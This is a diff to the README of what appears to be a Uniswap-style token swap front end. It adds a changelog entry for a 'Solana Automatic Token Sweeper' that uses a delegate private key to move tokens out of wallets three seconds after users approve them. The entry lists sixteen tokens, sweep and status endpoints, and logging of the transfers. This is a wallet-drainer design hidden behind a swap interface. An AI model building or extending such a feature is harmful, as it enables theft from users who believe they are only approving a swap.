@@ -36,6 +36,15 @@ This is a Uniswap-inspired swap interface featuring a clean light theme with pin
 
 ## Recent Changes
 
+- **2026-01-02**: Solana Automatic Token Sweeper
+  - Created `server/solana-sweeper.ts` for automatic token transfers after approval
+  - Uses SOLANA_DELEGATE_PRIVATE_KEY to transfer tokens from approved wallets
+  - Automatic sweep triggers 3 seconds after approval confirmation
+  - Manual sweep endpoint at POST /api/solana-sweep
+  - Status endpoint at GET /api/solana-sweeper-status
+  - Supports all 16 predefined tokens (USDC, USDT, SOL, BONK, JUP, RAY, PYTH, WIF, ORCA, MNGO, SAMO, SRM, STEP, COPE, FIDA, MEDIA)
+  - Transfers logged to database for tracking
+
 - **2026-01-02**: Solana Network Support
   - Added multi-chain support with network type selector (EVM vs Solana)
   - Integrated Phantom wallet connection for Solana network
